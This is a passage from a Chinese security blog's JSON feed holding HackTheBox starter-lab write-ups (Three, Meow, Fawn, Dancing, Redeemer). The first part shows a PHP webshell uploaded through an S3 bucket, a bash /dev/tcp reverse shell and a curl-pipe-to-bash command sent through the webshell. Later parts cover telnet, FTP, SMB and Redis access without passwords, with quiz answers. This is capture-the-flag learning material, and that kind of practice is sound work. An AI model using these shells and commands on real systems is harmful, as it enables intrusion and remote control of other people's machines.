W7GPqbX1+f10mO4hW+sLBDS9OP7FUNKkIJIDco4fpKhmOVAGHqcdXkSslzp2WcD0Tfw1KduMollWliWlasB86VvGUmc/9e20yUPdIFULWtFLTAzDFv4rryWhMzWh0JNKhhEr9KEaeBqUGYV82MWBylQVhUvxWI0l7kyu4v+xKqHTmHMoVcyvd5EtX5E9/y/0bW0cQAWHpvEE1fTfPg5TPz28aC6cRbczprH3/MHuY32/9xA9NivMP0r7WB3Y3euRVdnayhm55CvFhX4BpZ+1oOSE1UnaPnXM4z57v5ssv1yPnyjq/cuyLHsO3cGr//fz1nm9r+8EgNXnV7HW8+8zjaH7c1Ju43ASK9n+fz7+P2Nf+TRDg11vWzA6Q/44wUXkv7mPI7d+3DO3E3RuvI9nvlHrrQqOf9PXH7HJlx4zDbsNXcMH7/+IZONF3jPKadc0fjiwzy5bAa7iTd58LnVhRNLrWVFemsOP2A6YuVL3HzlNTyy3mt/WVDs+Uokpn2F0FFfK4XrBJ7KumzOR+NJYXRGHap8aXNgR1rqqYGFsDf2QL1FK3dQ1KQQ3nh9xiyHSQsxaxm1TeYCId7O31RC+O9TWxSuq1FB7BYpM6rcAhAZuUSuUifg4D+DDJQ2gSn8nqOLC77p4ozaZzDAEDBjrkskGsmklgzKwuNoO3bJDCphpi0sYStnVgSaiYEY4WIHguBaeF6LTWdtOywpKuM9tQFPJIHXqGVFsm0KysLt9NsabnuwFrs+sQxablEhkfQQDqCMckPoPoYTKB6Dqm9bwNBuHEE4kH2Yz6WHfZt/VBK8rtTzG3jv803fsj/KeSbMOIhcyYEowlQMdGYSIQTxeFWOV3al/hXBM+GmOrZNKpWsoKby25v/O3stT8KWvUT+5MjaUJIN5dJP0H57ZMnI+jrk2IW3NhgmpiEQyiXtOJ9qSVyB9sT/YpgRTOkdBmwfRwWmMJ8xZxschBBYVgTLsgpsD7VSJJKJkioDg6zXaDiobjmQVp45jwuZOG5ltzn0IcOY6V7fP3hx3PoBeqDt2foARl5y+B5tFkqoRYOTwOAiS/Usnu2x3EvvWznTtvEybJ9YCJisElbRpYQ6OsRzAL1IvQYpDEgvaeF66XZRCuo5ePXAQZYR8lT7vduG5rqQDjj1a42ri/e90DEhq2oVRcIUfVKgGI2U6mom13XwXYNjp3G0KljnP4PhBZ7tW8qXvmWdBwNnhFJMmykEFl7eZtFL/fkHt8CmLfBiD0OBglV4h2FRgjHMrtFZ+zqgqPT3/wNcBwL9KKaGLQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0wNi0xN1QwODoxOTo0NCswMDowMMX6/hkAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMDYtMTdUMDg6MTk6NDQrMDA6MDC0p0alAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDIzLTA2LTE3VDA4OjE5OjQ0KzAwOjAw47JnegAAAABJRU5ErkJggg==\" alt=\"\"></p>\n<p>将 shell.php 拷贝到 s3 桶当中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5Yg1W9MHjKXrcQhe.png!thumbnail\" alt=\"\"></p>\n<p>查看木马有没有被解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://thetoppers.htb/shell.php?nnnpc=ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bZ6AkRou0GXAc7ni.png!thumbnail\" alt=\"\"></p>\n<p>成功解析，在上一级目录获取到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://thetoppers.htb/shell.php?nnnpc=cat%20../flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8ZSWxN5Ophjm8nR9.png!thumbnail\" alt=\"\"></p>\n<p>接着试着利用该木马来获取 shell</p>\n<p>使用 ifconfig 命令查看 tun0（我这里查看到的 ip 为 10.10.14.125）</p>\n<p>接下来编写 shell 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.14.125/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gbcLLAifWLTJdDrU.png!thumbnail\" alt=\"\"></p>\n<p>在 shell.sh 的文件目录下用 python 开启 web 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8090</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oR7hY3d5PxN1an98.png!thumbnail\" alt=\"\"></p>\n<p>监听 5555 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lnvp 5555</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/A9N7w1J300ixa4Jg.png!thumbnail\" alt=\"\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC00aDFoZ2FiODhjMTFjbDF0YnlnendqbTI0YmQ1ZGJ3cnExYWRhNzQwOGQ3eGZoYTE1MjFoZGE5OTI1Yjc1Ym51MWouc2g=\">接下来用之前上的马来进行命令执行下载本地的 shell.sh</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://thetoppers.htb/shell.php?nnnpc=curl%2010.10.14.125:8090/shell.sh%20|%20bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/C9r9kxwMQ0A8zRQp.png!thumbnail\" alt=\"\"></p>\n<p>成功反弹 shell（没成功反弹的可以多执行几次 payload + 开关 vpn 试试）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NQGdLMaTvqEgZrKW.png!thumbnail\" alt=\"\"></p>\n<p>在上一级目录中获取到 flag</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/HackTheBox%20%E7%AC%AC0%E5%B1%82/",
            "url": "https://nnnpc.github.io/2024/04/16/HackTheBox%20%E7%AC%AC0%E5%B1%82/",
            "title": "HackTheBox 第0层",
            "date_published": "2024-04-16T05:58:18.995Z",
            "content_html": "<p>平台地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja3RoZWJveC5jb20v\">https://www.hackthebox.com/</span></p>\n<p>我这里选择的是自己下载 vpn，用 kali 来作为攻击机<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OTP2TRuU715UsWEJ.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>下载 UDP 1337，TCP 实测会比较慢并且不太稳定</p>\n<p>导入到 openvpn 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2Ki5QZfn93uz0geS.png!thumbnail\" alt=\"\"></p>\n<p>kali 中使用命令 openvpn 进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo openvpn openvpn文件</span><br></pre></td></tr></table></figure>\n<p>挂好 vpn 确保脸上之后下发靶机<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9O2oBK8A50lgw0BC.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"meow\"><a class=\"markdownIt-Anchor\" href=\"#meow\">#</a> <strong>Meow</strong></h1>\n<p>先 ping 一下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VrdvKL5Rl4X8v6A1.png!thumbnail\" alt=\"\"></p>\n<p>通了之后证明该 IP 能够成功被访问到</p>\n<p>接着用 nmap 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ur3Di8AVYx83jBaz.png!thumbnail\" alt=\"\"></p>\n<p>发现 23 端口开放并且服务是 telnet</p>\n<p>获取了一些基本端口信息之后看看问题</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sSjazpFWa4mkNSd3.png!thumbnail\" alt=\"\"></p>\n<p>上网查找一下，指的就是虚拟机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Virtual Machine</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/C5YFMdd1exnBy5pK.png!thumbnail\" alt=\"\"></p>\n<p>指的是终端</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：terminal</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v7fHItdN5NzS194s.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：openvpn</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E6Mg8PNw9olm5gZk.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：TUN</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XiiuOFrO7T78i6XA.png!thumbnail\" alt=\"\"></p>\n<p>利用回显测试连接，我们知道 Ping 方法使用的是 ICMP 协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Ping</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lnhWt6x19pUAIJwe.png!thumbnail\" alt=\"\"></p>\n<p>找端口的工具就是刚才使用的 nmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：nmap</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ATbNRAVU2MHfLhLp.png!thumbnail\" alt=\"\"></p>\n<p>刚才扫描出来了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：telnet</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/G3JYPe4xLwOFnYkU.png!thumbnail\" alt=\"\"></p>\n<p>题目询问什么用户不需要密码登录，查找资料</p>\n<blockquote>\n<p>Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登录服务的标准协议和主要方式。<br>\n可以使用 telnet 命令进行登录远程主机</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/exlmlnDvlWYBcjfz.png!thumbnail\" alt=\"\"></p>\n<p>并且 root 用户是可以进行免密登录的</p>\n<p>接下来查看路径并且使用命令获取 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls</span><br><span class=\"line\">cat flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ual3U6wWJYBMx5ss.png!thumbnail\" alt=\"\"></p>\n<h1 id=\"fawn\"><a class=\"markdownIt-Anchor\" href=\"#fawn\">#</a> <strong>Fawn</strong></h1>\n<p>同样的，拿到靶机先扫描一下端口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/a9zd2Q5UEeNBrfYh.png!thumbnail\" alt=\"\"></p>\n<p>发现 21 端口是开着的，显示 ftp 服务，看看问题</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tysE9ByDDIcE9gmh.png!thumbnail\" alt=\"\"></p>\n<p>搜索 FTP 全称</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：FileTransferProtocol</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b1CTDivCBAOzIDuc.png!thumbnail\" alt=\"\"></p>\n<p>根据刚才扫描的结果可以知道端口为 21</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：21</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ned74zdGfECoP406.png!thumbnail\" alt=\"\"></p>\n<p>搜索得到 SFTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：SFTP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xC7ZdfvCnHIlBgua.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：PING</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kyLoZxlhZIMrqUv4.png!thumbnail\" alt=\"\"></p>\n<p>根据之前的 nmap 扫描可以知道版本是 vsftpd 3.0.3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：vsftpd 3.0.3</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4MKlktVoxIJWzPZm.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：UNIX</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/priNyydkcHyR7cTx.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FzHpND5NTLHYyjJV.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：ftp -h</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SBuy1QPapU6F2THk.png!thumbnail\" alt=\"\"></p>\n<p>没有帐户的情况下登录使用 anonymous</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：anonymous</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aJ8j0BA7jK5XluJt.png!thumbnail\" alt=\"\"></p>\n<p>登陆成功的响应码，登录之后查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7PElE3jWwEItj7fW.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：230</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6EKNK3ijEUKFMSDx.png!thumbnail\" alt=\"\"></p>\n<p>列出可用的文件和目录的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/03cvF043yvcezVzQ.png!thumbnail\" alt=\"\"></p>\n<p>下载 ftp 服务器上找到文件的命令为 get</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：get</span><br></pre></td></tr></table></figure>\n<p>根据之前问题的提示，拿 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls</span><br><span class=\"line\">get flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jTUPKo3bSfeREsgq.png!thumbnail\" alt=\"\"></p>\n<p>可以看到 flag.txt 文件被从 ftp 服务器上下载到了本地</p>\n<p>接着在本地进行 cat 就可以了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KMlhEoHiyKZU9Pzl.png!thumbnail\" alt=\"\"></p>\n<h1 id=\"dancing\"><a class=\"markdownIt-Anchor\" href=\"#dancing\">#</a> <strong>Dancing</strong></h1>\n<p>扫描 IP</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lXcI0aKMiCO7VdbL.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/liifb5b4zLEyo66l.png!thumbnail\" alt=\"\"></p>\n<p>搜 SMB 全程就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Server Message Block</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FUvrjdQUSBhfonzB.png!thumbnail\" alt=\"\"></p>\n<p>上网搜索 SMB 的端口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9vM7T9md3ga89OWM.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：445</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vVtkQxEglB99P4qw.png!thumbnail\" alt=\"\"></p>\n<p>根据扫描结果查看 445 端口的服务为 microsoft-ds</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：microsoft-ds</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FRYQCt0LKTeFBL43.png!thumbnail\" alt=\"\"></p>\n<p>问的是 SMB 命令（smbclient）查看共享资源的参数，参数为 - L</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-L</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qHBIKPvaTcAECtvf.png!thumbnail\" alt=\"\"></p>\n<p>使用 smbclient 命令连接查看服务端分享的资源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient -L IP</span><br></pre></td></tr></table></figure>\n<p>连不上的多连几遍，可能是 vpn 的问题，访问不太稳定<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1AsVdLRCVc4gNFaT.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>没有密码直接回车就好，问题问的是有几个共享文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：4</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WNB1lpFIjJuPmq7f.png!thumbnail\" alt=\"\"></p>\n<p>这里能无密码连接的共享文件就是最后一个 WorkShares</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：WorkShares</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/njjXbUlU72JrQrOA.png!thumbnail\" alt=\"\"></p>\n<p>同样问下载文件的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：get</span><br></pre></td></tr></table></figure>\n<p>接下来就是拿 flag 了，首先先连接共享文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient \\\\\\\\IP\\\\WorkShares</span><br></pre></td></tr></table></figure>\n<p>这里也是多连接访问几次，或者把 vpn 关掉重开</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls</span><br><span class=\"line\">cd James.P</span><br><span class=\"line\">ls</span><br><span class=\"line\">get flag.txt/more flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OUEJ1M9OO33i1n4M.png!thumbnail\" alt=\"\"></p>\n<p>这里根据之前题目的提示可以知道最终 get 下载 flag.txt 文件（下载好之后直接本地 cat 就好）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jU4JgizLyQ2kb5w4.png!thumbnail\" alt=\"\"></p>\n<p>但同时也可以使用 more 命令直接查看 flag，如下图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KAP9JpmmAGaBU44n.png!thumbnail\" alt=\"\"></p>\n<h1 id=\"redeemer\"><a class=\"markdownIt-Anchor\" href=\"#redeemer\">#</a> <strong>Redeemer</strong></h1>\n<p>扫描下 IP，看看开放的端口</p>\n<p>可能是 vpn 的问题，我一直都没有扫出来对应开放的端口，所以看了下网上的 wp</p>\n<p>发现开放的是 6379 端口，考的应该是 redis 未授权漏洞</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/M2slLxovhkRz2jI2.png!thumbnail\" alt=\"\"></p>\n<p>这个问的就是开放的端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：6379</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/G6jzmg7ri6I8aBfV.png!thumbnail\" alt=\"\"></p>\n<p>询问开放端口上的服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Redis</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/daSHcOLmCJEqSa9R.png!thumbnail\" alt=\"\"></p>\n<p>选择题选择第一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：In-memory Database</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vSbvxjB3JkAQ1klw.png!thumbnail\" alt=\"\"></p>\n<p>询问能连接 redis 服务器的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：redis-cli</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FHTnoAmO6lvChzsz.png!thumbnail\" alt=\"\"></p>\n<p>命令所使用标记主机的参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-h</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pEftZSW3Lt5nMlgd.png!thumbnail\" alt=\"\"></p>\n<p>查看服务器信息的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：info</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SQ7DrBiakkIbJ6oG.png!thumbnail\" alt=\"\"></p>\n<p>redis 版本，连接上之后使用 info 命令查看版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo redis-cli -h IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jfnAB2h0WjWcZnbQ.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：5.0.7</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oE66G9aNWeyf2ype.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：select</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4QquahbNqlv8hub8.png!thumbnail\" alt=\"\"></p>\n<p>索引为 0 的数据库有多少个键，在之前的 info 信息中寻找信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HAkUznIOPKuzl56v.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：4</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T5NEqrqGJQNrPvo0.png!thumbnail\" alt=\"\"></p>\n<p>查看所有键的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：keys *</span><br></pre></td></tr></table></figure>\n<p>接下来获取最后的 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZMrijMJoDucgKRgV.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0/",
            "title": "go语言函数",
            "date_published": "2024-04-16T05:58:18.994Z",
